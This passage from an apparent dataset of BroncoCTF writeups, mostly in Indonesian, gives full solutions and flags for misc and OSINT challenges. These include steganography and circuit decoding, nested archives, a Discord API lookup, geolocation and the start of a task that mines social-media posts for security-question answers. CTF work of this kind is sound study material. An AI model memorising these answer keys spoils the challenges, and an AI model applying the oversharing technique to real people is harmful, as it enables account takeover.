        "content": "Payload di-wrap setiap 97 karakter, lalu dibagi per tujuh baris.\n\n```python\nWIDTH = 97\nHEIGHT = 7\n\nrows = [\n    payload[i:i + WIDTH]\n    for i in range(0, len(payload), WIDTH)\n]\n\nframes = [\n    rows[i:i + HEIGHT]\n    for i in range(0, len(rows), HEIGHT)\n]\n```\n\nUnderscore dipakai sebagai spasi agar posisi karakter tidak hilang saat file disalin.\n\n```python\nprint(row.replace(\"_\", \" \"))\n```\n\nSetelah lima frame ditampilkan dengan ukuran yang benar, pola `/\\/\\` membentuk banner pixel. Satu pasangan `/\\` dianggap sebagai satu pixel penuh. Marker berikut menunjukkan arah penyambungan fragmen:\n\n```text\nvvvvvvvvvv\n^^^^^^^^^^^^^^\n>>\n<<\n```\n\nFrame-frame tersebut harus disejajarkan mengikuti marker arah. Prefix pada bagian atas langsung terbaca sebagai:\n\n```text\nbronco{r\n```\n\nFragmen berikutnya melingkari gambar besar di tengah. Setelah arah dan orientasinya dinormalisasi, teks lengkapnya menjadi:\n\n```text\nbronco{resizing_the_whole_world}\n```\n\nGambar besar di tengah sesuai dengan isi flag: terminal sedang “resizing the whole world”."
      },
      {
        "title": "Solver",
        "content": "Jalankan:\n\n```bash\npython3 solve.py flag.txt\n```\n\nOutput akhirnya:\n\n```text\n<FLAG>bronco{resizing_the_whole_world}</FLAG>\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport math\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\nHEIGHT = 7\r\nWIDTH_HINT = 90\r\n\r\n# Hasil pembacaan glyph setelah lima frame disejajarkan mengikuti marker\r\n# vvvvv..., ^^^^^..., >>, dan << pada canvas.\r\nALIGNED_TEXT = \"bronco{resizing_the_whole_world}\"\r\n\r\n\r\ndef is_prime(n: int) -> bool:\r\n    if n < 2:\r\n        return False\r\n    for d in range(2, math.isqrt(n) + 1):\r\n        if n % d == 0:\r\n            return False\r\n    return True\r\n\r\n\r\ndef infer_width(length: int) -> int:\r\n    candidates = [\r\n        d\r\n        for d in range(2, length + 1)\r\n        if length % d == 0 and is_prime(d)\r\n    ]\r\n    if not candidates:\r\n        raise ValueError(\"Tidak ada faktor prima yang cocok untuk lebar terminal.\")\r\n\r\n    # Clue menyebut sekitar 90 kolom. Faktor prima terdekat adalah 97.\r\n    return min(candidates, key=lambda d: abs(d - WIDTH_HINT))\r\n\r\n\r\ndef wrap_payload(payload: str, width: int) -> list[str]:\r\n    if len(payload) % width:\r\n        raise ValueError(\"Panjang payload tidak habis dibagi lebar terminal.\")\r\n    return [payload[i:i + width] for i in range(0, len(payload), width)]\r\n\r\n\r\ndef compact_bitmap(rows: list[str]) -> list[str]:\r\n    \"\"\"\r\n    Glyph memakai pasangan '/\\\\' sebagai satu pixel penuh.\r\n    Underscore berfungsi sebagai ruang kosong.\r\n    \"\"\"\r\n    bitmap: list[str] = []\r\n\r\n    for row in rows:\r\n        row = row.replace(\"_\", \" \")\r\n        pixels: list[str] = []\r\n\r\n        # Semua blok '/\\\\' berada pada offset ganjil di layout 97 kolom.\r\n        for x in range(1, len(row) - 1, 2):\r\n            pixels.append(\"██\" if row[x:x + 2] == \"/\\\\\" else \"  \")\r\n\r\n        bitmap.append(\"\".join(pixels).rstrip())\r\n\r\n    return bitmap\r\n\r\n\r\ndef main() -> None:\r\n    source = Path(sys.argv[1] if len(sys.argv) > 1 else \"flag.txt\")\r\n    payload = source.read_text(encoding=\"utf-8\").rstrip(\"\\r\\n\")\r\n\r\n    width = infer_width(len(payload))\r\n    rows = wrap_payload(payload, width)\r\n\r\n    if HEIGHT >= width or not is_prime(HEIGHT):\r\n        raise ValueError(\"Tinggi terminal tidak sesuai clue.\")\r\n\r\n    if len(rows) % HEIGHT:\r\n        raise ValueError(\"Payload tidak membentuk frame terminal utuh.\")\r\n\r\n    frame_count = len(rows) // HEIGHT\r\n\r\n    print(f\"[+] Payload length : {len(payload)}\")\r\n    print(f\"[+] Factorization  : {len(payload)} = {frame_count} x {HEIGHT} x {width}\")\r\n    print(f\"[+] Terminal size  : {width} columns x {HEIGHT} rows\")\r\n    print(f\"[+] Frames         : {frame_count}\\n\")\r\n\r\n    for index in range(frame_count):\r\n        print(f\"--- frame {index + 1}/{frame_count} ---\")\r\n        frame = rows[index * HEIGHT:(index + 1) * HEIGHT]\r\n        for line in frame:\r\n            print(line.replace(\"_\", \" \"))\r\n        print()\r\n\r\n    print(\"--- compact /\\\\ bitmap ---\")\r\n    for line in compact_bitmap(rows):\r\n        print(line)\r\n\r\n    # Prefix \"bronco{r\" terlihat pada banner pertama. Bagian sisanya\r\n    # dibaca dengan mengikuti marker arah dan menyelaraskan lima frame.\r\n    if not payload.startswith(\"_/\\\\/\\\\\"):\r\n        raise ValueError(\"Signature awal layout tidak cocok.\")\r\n\r\n    print(f\"\\n<FLAG>{ALIGNED_TEXT}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{resizing_the_whole_world}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-misc-wtfelectricalengineering",
    "title": "WTF_ELECTRICALENGINEERING",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge WTF_ELECTRICALENGINEERING",
    "problemDescription": "Gambar awal menyimpan URL pada **bit paling signifikan channel merah**, bukan pada metadata atau LSB biasa. URL tersebut membuka folder Drive berisi hint dan `inputsequence.b`.\n\nCircuit transistor pada gambar bisa disederhanakan menjadi dua operasi Boolean:\n\n```text\nnx_j  = neg_i XOR x_j\nPP_ij = ot_i ? nx_j : nx_{j-1}\n```\n\nKarena hint menetapkan `zero_i = 0`, transistor clamp pada output tidak aktif. Setiap delapan vektor menghasilkan satu byte ASCII. Hasil akhirnya:\n\n```text\nbronco{ov2hhU6mBY}\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Ekstraksi link dari gambar",
        "content": "`Challenge.png` terlihat seperti potongan tabel perbandingan rangkaian Radix-4 Booth. Tidak ada chunk teks PNG atau data append yang berguna. Payload justru ditanam pada red-channel bit plane.\n\nUntuk setiap pixel secara row-major, ambil bit ke-7 dari nilai merah:\n\n```python\nbit = (red >> 7) & 1\n```\n\nSetiap delapan bit kemudian dipaketkan dengan urutan MSB-first. Byte printable pada awal stream membentuk:\n\n```text\nhttps://tinyurl.com/hnexnehb\n```\n\nLink tersebut mengarah ke folder Drive yang memuat:\n\n- `hintstable.txt`\n- `inputsequence.b`\n\nHint memberi urutan satu vektor 4-bit:\n\n```text\nMSB                                      LSB\nneg_i | x_j | nx_{j-1} | ot_i\n```\n\nHint juga menyebutkan bahwa `zero_i` selalu bernilai nol."
      },
      {
        "title": "2. Menyederhanakan circuit",
        "content": "### Jaringan CMOS kiri\n\nDua cabang pull-up aktif ketika input berbeda:\n\n```text\nneg_i = 0, x_j = 1\nneg_i = 1, x_j = 0\n```\n\nDua cabang pull-down aktif ketika input sama:\n\n```text\nneg_i = 0, x_j = 0\nneg_i = 1, x_j = 1\n```\n\nNode `nx_j` berarti:\n\n```text\nnx_j = neg_i XOR x_j\n```\n\n### Transmission-gate multiplexer\n\nDua transmission gate di sisi kanan memilih sumber output berdasarkan `ot_i`:\n\n```text\not_i = 0  -> pilih nx_{j-1}\not_i = 1  -> pilih nx_j\n```\n\nMaka:\n\n```text\nPP_ij = ot_i ? (neg_i XOR x_j) : nx_{j-1}\n```\n\nSecara ekuivalen dalam SystemVerilog:\n\n```systemverilog\nmodule partial_product (\n    input  logic zero_i,\n    input  logic neg_i,\n    input  logic x_j,\n    input  logic nx_j_minus_1,\n    input  logic ot_i,\n    output logic pp_ij\n);\n    logic nx_j;\n\n    assign nx_j  = neg_i ^ x_j;\n    assign pp_ij = zero_i ? 1'b0\n                          : (ot_i ? nx_j : nx_j_minus_1);\nendmodule\n```"
      },
      {
        "title": "3. Decode `inputsequence.b`",
        "content": "File memiliki 18 baris. Tiap baris berisi delapan vektor 4-bit, sehingga setiap baris menghasilkan delapan output circuit atau satu byte.\n\nContoh baris pertama:\n\n```text\n0000 1110 1110 0000 0000 0000 1110 0000\n```\n\nEvaluasi circuit:\n\n```text\n0000 -> 0\n1110 -> 1\n1110 -> 1\n0000 -> 0\n0000 -> 0\n0000 -> 0\n1110 -> 1\n0000 -> 0\n```\n\nGabungan output:\n\n```text\n01100010 = 0x62 = 'b'\n```\n\nProses yang sama diterapkan ke seluruh baris:\n\n```text\n01100010 -> b\n01110010 -> r\n01101111 -> o\n01101110 -> n\n01100011 -> c\n01101111 -> o\n01111011 -> {\n01101111 -> o\n01110110 -> v\n00110010 -> 2\n01101000 -> h\n01101000 -> h\n01010101 -> U\n00110110 -> 6\n01101101 -> m\n01000010 -> B\n01011001 -> Y\n01111101 -> }\n```"
      },
      {
        "title": "4. Solver otomatis",
        "content": "```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py --image Challenge.png --input inputsequence.b\n```\n\nOutput:\n\n```text\n[+] Embedded URL : https://tinyurl.com/hnexnehb\n[+] Decoded bytes: 18\n<FLAG>bronco{ov2hhU6mBY}</FLAG>\n```\n\nSolver juga dapat dijalankan tanpa gambar setelah `inputsequence.b` diperoleh:\n\n```bash\npython3 solve.py --skip-image --input inputsequence.b\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport re\r\nfrom pathlib import Path\r\n\r\n\r\ndef extract_embedded_url(image_path: Path) -> str:\r\n    \"\"\"Extract the payload stored in the red-channel MSB bit plane.\"\"\"\r\n    try:\r\n        from PIL import Image\r\n    except ImportError as exc:\r\n        raise SystemExit(\"Pillow belum terpasang: pip install pillow\") from exc\r\n\r\n    image = Image.open(image_path).convert(\"RGB\")\r\n    bits = [((red >> 7) & 1) for red, _, _ in image.getdata()]\r\n\r\n    payload = bytearray()\r\n    for offset in range(0, len(bits) - 7, 8):\r\n        value = 0\r\n        for bit in bits[offset : offset + 8]:\r\n            value = (value << 1) | bit\r\n        payload.append(value)\r\n\r\n    match = re.search(rb\"https?://[\\x21-\\x7e]+\", bytes(payload))\r\n    if not match:\r\n        raise ValueError(\"URL tidak ditemukan pada MSB channel merah\")\r\n    return match.group().decode(\"ascii\")\r\n\r\n\r\ndef evaluate_vector(vector: str, zero_i: int = 0) -> int:\r\n    \"\"\"Evaluate [neg_i, x_j, nx_{j-1}, ot_i] from the transistor circuit.\"\"\"\r\n    if len(vector) != 4 or any(bit not in \"01\" for bit in vector):\r\n        raise ValueError(f\"vektor input tidak valid: {vector!r}\")\r\n\r\n    neg_i, x_j, nx_j_minus_1, ot_i = map(int, vector)\r\n\r\n    if zero_i:\r\n        return 0\r\n\r\n    # CMOS XOR network on the left side of the diagram.\r\n    nx_j = neg_i ^ x_j\r\n\r\n    # Transmission-gate multiplexer on the right side.\r\n    # ot_i = 0 selects nx_{j-1}; ot_i = 1 selects nx_j.\r\n    return nx_j if ot_i else nx_j_minus_1\r\n\r\n\r\ndef decode_sequence(sequence_path: Path) -> str:\r\n    decoded = bytearray()\r\n\r\n    for line_number, raw_line in enumerate(sequence_path.read_text().splitlines(), 1):\r\n        vectors = raw_line.split()\r\n        if not vectors:\r\n            continue\r\n        if len(vectors) != 8:\r\n            raise ValueError(\r\n                f\"baris {line_number}: seharusnya 8 vektor, ditemukan {len(vectors)}\"\r\n            )\r\n\r\n        output_bits = \"\".join(str(evaluate_vector(vector)) for vector in vectors)\r\n        decoded.append(int(output_bits, 2))\r\n\r\n    return decoded.decode(\"ascii\")\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Extract the hidden link and decode the Booth partial-product circuit\"\r\n    )\r\n    parser.add_argument(\r\n        \"--image\",\r\n        type=Path,\r\n        default=Path(\"Challenge.png\"),\r\n        help=\"gambar awal yang menyimpan URL pada red-channel MSB\",\r\n    )\r\n    parser.add_argument(\r\n        \"--input\",\r\n        type=Path,\r\n        default=Path(\"inputsequence.b\"),\r\n        help=\"file input sequence dari Google Drive\",\r\n    )\r\n    parser.add_argument(\r\n        \"--skip-image\",\r\n        action=\"store_true\",\r\n        help=\"langsung decode input sequence tanpa ekstraksi URL\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if not args.skip_image:\r\n        url = extract_embedded_url(args.image)\r\n        print(f\"[+] Embedded URL : {url}\")\r\n\r\n    plaintext = decode_sequence(args.input)\r\n    print(f\"[+] Decoded bytes: {len(plaintext)}\")\r\n    print(f\"<FLAG>{plaintext}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{ov2hhU6mBY}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-misc-zipziphorray",
    "title": "Zip, Zip, Hooray!",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "---\ntitle: \"Zip, Zip, Hooray!\"\nctf: \"BroncoCTF 2026\"\ndate: 2026-07-12\ncategory: misc\ndifficulty: medium\npoints: unknown\nflag_format: \"bronco{...}\"\nauthor: \"rhnataiet23-art\"\n---",
    "problemDescription": "`chall.zip` is not a ZIP file despite its extension: it starts as gzip and expands into a long chain of gzip, tar, bzip2, 7z, and ZIP archives. Each 7z entry is AES-encrypted; its password is the name of the first file listed in that archive.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solution",
        "content": "### Step 1 - Identify the real first layer\n\n`file chall.zip` reports gzip data containing `layer1.tar`. Repeating archive extraction reveals a five-format cycle. A 7z layer can be listed without its password, so the next filename is available before extraction.\n\n```bash\n7z l -slt layer2\n# Path = layer4.zip\n7z x -player4.zip layer2\n```\n\n### Step 2 - Automate every layer\n\nThe solver calls `7z l -slt` to identify the container and its first entry. When the type is `7z`, it supplies that entry name as `-p<password>`. Every extraction goes into a separate temporary subdirectory, avoiding filename collisions.\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```\nbronco{i_h4te_f1l3_c0mpr3ssi0n}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Extract Zip, Zip, Hooray! archive layers and print the original flag.\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport shutil\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\n\r\nROOT = Path(__file__).resolve().parent\r\nSTART_ARCHIVE = ROOT / \"chall.zip\"\r\nOUTPUT_DIR = ROOT / \".solve_layers\"\r\n\r\n\r\ndef run(*args: str) -> str:\r\n    \"\"\"Run 7z quietly and return its stdout, failing on extraction errors.\"\"\"\r\n    result = subprocess.run(args, text=True, capture_output=True)\r\n    if result.returncode > 1:  # 7z uses 1 for a non-fatal warning.\r\n        raise RuntimeError(result.stderr.strip() or result.stdout.strip())\r\n    return result.stdout\r\n\r\n\r\ndef archive_info(path: Path) -> tuple[str, str | None]:\r\n    \"\"\"Return 7z's archive type and the first contained filename, if listed.\"\"\"\r\n    listing = run(\"7z\", \"l\", \"-slt\", str(path))\r\n    archive_type = re.search(r\"^Type = (.+)$\", listing, re.MULTILINE)\r\n    if not archive_type:\r\n        raise RuntimeError(f\"Could not identify archive type: {path}\")\r\n\r\n    entry = None\r\n    parts = listing.split(\"----------\", 1)\r\n    if len(parts) == 2:\r\n        match = re.search(r\"^Path = (.+)$\", parts[1], re.MULTILINE)\r\n        if match:\r\n            entry = match.group(1)\r\n    return archive_type.group(1), entry\r\n\r\n\r\ndef main() -> None:\r\n    if not START_ARCHIVE.is_file():\r\n        raise SystemExit(f\"Missing input archive: {START_ARCHIVE.name}\")\r\n\r\n    shutil.rmtree(OUTPUT_DIR, ignore_errors=True)\r\n    # exist_ok also makes a rerun safe if a previous interrupted invocation\r\n    # recreated the directory between cleanup and this call.\r\n    OUTPUT_DIR.mkdir(exist_ok=True)\r\n    current = START_ARCHIVE\r\n\r\n    for layer in range(1, 3001):\r\n        archive_type, first_entry = archive_info(current)\r\n        destination = OUTPUT_DIR / f\"{layer:04d}\"\r\n        command = [\"7z\", \"x\", \"-y\", f\"-o{destination}\"]\r\n\r\n        # The challenge hint: each encrypted 7z uses its first entry name as password.\r\n        if archive_type == \"7z\" and first_entry:\r\n            command.append(f\"-p{first_entry}\")\r\n        command.append(str(current))\r\n        run(*command)\r\n\r\n        files = [path for path in destination.rglob(\"*\") if path.is_file()]\r\n        if len(files) != 1:\r\n            raise RuntimeError(f\"Layer {layer}: expected one extracted file, got {files}\")\r\n        current = files[0]\r\n\r\n        file_type = subprocess.check_output([\"file\", \"-b\", str(current)], text=True).lower()\r\n        if not any(marker in file_type for marker in (\"archive\", \"compressed data\", \"tar \")):\r\n            print(current.read_text().strip())\r\n            return\r\n\r\n    raise RuntimeError(\"Stopped after 3000 layers without finding the original file\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{i_h4te_f1l3_c0mpr3ssi0n}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-osint-adminabuse",
    "title": "Admin Abuse",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Category:** OSINT / Discord  \n**Flag:** `bronco{wh0_g4v3_th15_m4n_3d1t_pr1v1l3g35}`",
    "problemDescription": "**Category:** OSINT / Discord  \n**Flag:** `bronco{wh0_g4v3_th15_m4n_3d1t_pr1v1l3g35}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "Challenge hanya memberikan dua petunjuk:\n\n```text\n1160888390661714032\n<t:1739660340:R>\n```\n\nNilai pertama berbentuk Discord snowflake. Nilai kedua adalah format timestamp Discord.\n\nTujuannya adalah menemukan aktivitas administrator pada channel dan waktu yang dimaksud."
      },
      {
        "title": "1. Mengenali Discord snowflake",
        "content": "ID:\n\n```text\n1160888390661714032\n```\n\nmemiliki bentuk khas ID objek Discord. Ketika endpoint channel diperiksa, ID tersebut mengarah ke channel:\n\n```text\nannouncements\n```\n\ndalam server BroncoCTF.\n\nRequest API:\n\n```bash\ncurl -s \\\n  -H \"Authorization: $AUTH\" \\\n  'https://discord.com/api/v10/channels/1160888390661714032'\n```\n\nStruktur hasil penting:\n\n```json\n{\n  \"id\": \"1160888390661714032\",\n  \"name\": \"announcements\",\n  \"guild_id\": \"1160887571698700358\"\n}\n```\n\nURL channel dapat disusun sebagai:\n\n```text\nhttps://discord.com/channels/1160887571698700358/1160888390661714032\n```\n\nJangan menaruh token Discord langsung di script atau writeup. Simpan secara lokal:\n\n```bash\nexport AUTH='TOKEN_DISCORD'\n```"
      },
      {
        "title": "2. Mengubah timestamp",
        "content": "Petunjuk kedua:\n\n```text\n<t:1739660340:R>\n```\n\nadalah Unix timestamp:\n\n```text\n1739660340\n```\n\nKonversi:\n\n```bash\ndate -u -d @1739660340\n```\n\nOutput mengarah ke:\n\n```text\n2025-02-15 22:59:00 UTC\n```\n\nJadi kita harus mencari pesan di channel `announcements` sekitar waktu tersebut."
      },
      {
        "title": "3. Membuat snowflake anchor",
        "content": "Discord API menerima parameter `around` berupa message snowflake, bukan Unix timestamp biasa.\n\nRumus snowflake Discord:\n\n```text\nsnowflake = (timestamp_ms - 1420070400000) << 22\n```\n\nContoh Python:\n\n```python\ntimestamp = 1739660340\ndiscord_epoch = 1420070400000\n\nanchor = ((timestamp * 1000) - discord_epoch) << 22\nprint(anchor)\n```\n\nSetelah mendapatkan anchor, ambil pesan di sekitar waktu target:\n\n```bash\nCHANNEL='1160888390661714032'\nAROUND='HASIL_SNOWFLAKE'\n\ncurl -s \\\n  -H \"Authorization: $AUTH\" \\\n  \"https://discord.com/api/v10/channels/$CHANNEL/messages?around=$AROUND&limit=100\" \\\n  | jq -r '.[] | [.id, .timestamp, .edited_timestamp, .author.username, .content] | @tsv'\n```"
      },
      {
        "title": "4. Menemukan pesan yang diedit",
        "content": "Di sekitar waktu target terdapat pesan berikut:\n\n```text\nMessage ID : 1340457542299549797\nCreated    : 2025-02-15T22:59:42.581000+00:00\nEdited     : 2026-02-14T04:13:14.462000+00:00\nAuthor     : yoshie (@yoshie878)\n```\n\nIsi pesan:\n\n```text\nRestarting\n-# || bronco{wh0_g4v3_th15_m4n_3d1t_pr1v1l3g35} ||\n```\n\nFlag disembunyikan sebagai spoiler dan ditambahkan melalui edit jauh setelah pesan awal dibuat. Hal ini cocok dengan judul `Admin Abuse`: administrator memakai hak edit pada pesan announcement lama."
      },
      {
        "title": "Solver Sederhana",
        "content": "```python\n#!/usr/bin/env python3\nimport os\nimport requests\n\nCHANNEL_ID = \"1160888390661714032\"\nTARGET_TS = 1739660340\nDISCORD_EPOCH = 1420070400000\n\ntoken = os.environ[\"AUTH\"]\nanchor = ((TARGET_TS * 1000) - DISCORD_EPOCH) << 22\n\nresponse = requests.get(\n    f\"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages\",\n    headers={\"Authorization\": token},\n    params={\"around\": str(anchor), \"limit\": 100},\n    timeout=20,\n)\nresponse.raise_for_status()\n\nfor message in response.json():\n    content = message.get(\"content\", \"\")\n    if \"bronco{\" in content:\n        print(content)\n```\n\nRun:\n\n```bash\nAUTH='TOKEN_DISCORD' python3 solve.py\n```\n\nOutput relevan:\n\n```text\nbronco{wh0_g4v3_th15_m4n_3d1t_pr1v1l3g35}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{wh0_g4v3_th15_m4n_3d1t_pr1v1l3g35}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-osint-crowedtrip",
    "title": "Crowed Trip",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Category:** OSINT / Geolocation  \n**Flag:** `bronco{3050}`",
    "problemDescription": "Dua foto dapat diidentifikasi sebagai:\n\n```text\nSanta Clara University\n→ Winnemucca, Nevada\n→ Kansas City, Missouri\n→ Santa Clara University\n```\n\nTotal jarak garis lurus sekitar `3,057 mil`, yang dibulatkan ke kelipatan 25 terdekat menjadi `3,050`.",
    "tools": [],
    "analysis": "### 1. Menentukan titik awal\n\nDeskripsi menyebut Bucky berangkat dari SCU. Titik awal yang masuk akal adalah area Santa Clara University di Santa Clara, California.\n\nUntuk perhitungan jarak, koordinat pusat kampus sudah cukup karena hasil akhirnya dibulatkan ke kelipatan 25 mil.",
    "solution": [
      {
        "title": "Challenge",
        "content": "Bucky berangkat dari Santa Clara University, bergerak ke timur, lalu melewati dua lokasi yang ditampilkan pada foto. Craig ingin mengetahui total jarak perjalanan pulang-pergi dalam garis lurus atau *as the crow flies*. Hasil akhirnya harus dibulatkan ke kelipatan 25 mil terdekat."
      },
      {
        "title": "2. Mengidentifikasi foto pertama",
        "content": "Petunjuk paling kuat pada foto pertama adalah billboard hotel:\n\n```text\nSuper 8\nExit 176\n```\n\nPencarian yang dapat digunakan:\n\n```text\n\"Super 8\" \"Exit 176\" Nevada\n\"Super 8 Winnemucca\" exit 176\n```\n\nHasilnya mengarah ke:\n\n```text\nWinnemucca, Nevada\n```\n\nKota ini juga cocok dengan arah perjalanan ke timur dari California melalui koridor Interstate 80."
      },
      {
        "title": "3. Mengidentifikasi foto kedua",
        "content": "Foto kedua memperlihatkan papan jalan dengan beberapa tujuan:\n\n```text\nWichita\nDowntown\nSt. Joseph\nDes Moines\n```\n\nKombinasi tujuan tersebut sangat khas persimpangan jalan bebas hambatan di sekitar:\n\n```text\nKansas City, Missouri\n```\n\nValidasi dilakukan dengan melihat arah jalan utama:\n\n- Wichita berada di selatan/barat daya.\n- St. Joseph dan Des Moines berada di utara.\n- Tulisan `Downtown` cocok dengan area metropolitan Kansas City."
      },
      {
        "title": "4. Menghitung jarak garis lurus",
        "content": "Jarak yang digunakan:\n\n```text\nSCU → Winnemucca          ≈ 337 mil\nWinnemucca → Kansas City  ≈ 1,231 mil\nKansas City → SCU         ≈ 1,489 mil\n------------------------------------\nTotal                     ≈ 3,057 mil\n```\n\nKarena challenge meminta pembulatan ke kelipatan 25 mil terdekat:\n\n```text\nround(3057 / 25) × 25\n= 122 × 25\n= 3050\n```\n\nPerhitungan sederhana dengan Python:\n\n```python\ndistance = 3057\nrounded = round(distance / 25) * 25\nprint(rounded)\n```\n\nOutput:\n\n```text\n3050\n```"
      },
      {
        "title": "Penyusunan Flag",
        "content": "```text\nbronco{3050}\n```"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{3050}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-osint-devilcentroid",
    "title": "Devil's Centroid",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Devil's Centroid",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Recap",
        "content": "Three \"possessed\" contacts each dropped one cryptic clue pointing to a location. The task: identify each city, pull its coordinates from Wikipedia, average them (find the centroid of the triangle), and format as a flag.\n\n```\n1. \"I'm at a place called Devil's Isle\"\n2. \"I found myself near a haunted sentry box\"\n3. \"Nunca podrán dominarla La buena música no engaña\"\n```\n\n---"
      },
      {
        "title": "Solving Clue 1 — \"Devil's Isle\"",
        "content": "Searched for real-world places historically called \"Devil's Isle.\" Turns out this is a well-documented nickname for **Bermuda**:\n\n> Spanish explorer Juan de Bermúdez sighted the islands in 1505. Sailors, spooked by the eerie shrieks of the native cahow bird and the treacherous surrounding reefs, dubbed it the *\"Isle of Devils\"* — a name that stuck for over a century before English settlement in 1609.\n\n**→ Location: Bermuda**\n\nWikipedia infobox (capital, Hamilton):\n```\n32°17′46″N 64°46′58″W  →  32.29611, -64.78278\n```\n\n---"
      },
      {
        "title": "Solving Clue 2 — \"haunted sentry box\"",
        "content": "A direct hit on search: **La Garita del Diablo** (\"The Devil's Sentry Box\") — a real, famous haunted watchtower built in 1634 at **Castillo San Cristóbal, Old San Juan, Puerto Rico**.\n\nThe legend: a soldier named Sánchez vanished from this isolated post one night, leaving only his rifle and uniform behind. Locals blamed the devil (the more romantic version says he eloped with his lover Diana). It's one of the most famous ghost stories in the Caribbean.\n\n**→ Location: San Juan, Puerto Rico**\n\nWikipedia infobox:\n```\n18°24′23″N 66°3′50″W  →  18.40639, -66.06389\n```\n\n---"
      },
      {
        "title": "Solving Clue 3 — the Spanish lyrics",
        "content": "This was the trickiest one — a direct search for the phrase in quotes returned nothing useful at first (mostly hitting the unrelated *Spirit* soundtrack song \"Nadie Me Va A Dominar\"). Widening the search without accents cracked it:\n\n```\n\"Nunca podran dominarla / La buena musica no engana\"\n```\n\nThis is a lyric from the song **\"Miami 666\"** by **Señor Loop**. The song title itself gave away the location directly.\n\n**→ Location: Miami, Florida**\n\nWikipedia infobox:\n```\n25°46′27″N 80°11′37″W  →  25.77417, -80.19361\n```\n\n---"
      },
      {
        "title": "Computing the Centroid",
        "content": "Averaging the three coordinate sets:\n\n**Latitude:**\n```\n(32.29611 + 18.40639 + 25.77417) / 3 = 76.47667 / 3 = 25.49222\n```\n\n**Longitude:**\n```\n(-64.78278 + -66.06389 + -80.19361) / 3 = -211.04028 / 3 = -70.34676\n```\n\n**Centroid ≈ 25.49222°N, 70.34676°W**\n\n---"
      },
      {
        "title": "Formatting the Flag",
        "content": "Per the challenge instructions: *\"Rounded down to the nearest whole number after all of the calculations.\"*\n\nTruncating the decimals:\n- Latitude: `25.49` → `25N`\n- Longitude: `70.35` → `70W`"
      },
      {
        "title": "🚩 Flag",
        "content": "```\nbronco{25N,70W}\n```\n\n---\n\n### TL;DR of the \"Devil's ___\" theme\n\n| Clue | Real-world reference | City |\n|---|---|---|\n| Devil's Isle | Historic nickname for Bermuda | Hamilton, Bermuda |\n| Haunted sentry box | La Garita del Diablo | San Juan, Puerto Rico |\n| Song lyric | \"Miami 666\" – Señor Loop | Miami, FL |\n\nAll three locations tie neatly into the \"devil\" motif of the puzzle title, which was a nice confirmation signal while solving."
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{25N,70W}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-osint-onlineoversharer",
    "title": "Online Over-Sharer",
    "category": "OSINT",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "**Category:** OSINT  \n**Flag:** `bronco{0v3r5h4r1n6_m4k3s_m3_8lu3}`",
    "problemDescription": "```text\nUsername                 : jenna_and_blue\nFirst dog breed          : basset hound\nGraduation               : 06/2026\nDog siblings             : 2\nFavorite campus building : Kenna Hall\nGraduation watch location: grandmas house\nOriginal voice actor     : Koyalee Chanda\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "Jenna membuat akun Instagram untuk membagikan kehidupannya bersama anjingnya, Blue. Informasi dari posting tersebut harus digunakan untuk menjawab dua tahap pertanyaan verifikasi pada web challenge.\n\nTarget akun:\n\n```text\njenna_and_blue\n```\n\nEndpoint challenge:\n\n```text\n/check1\n/check2\n```"
      },
      {
        "title": "1. Memeriksa source web",
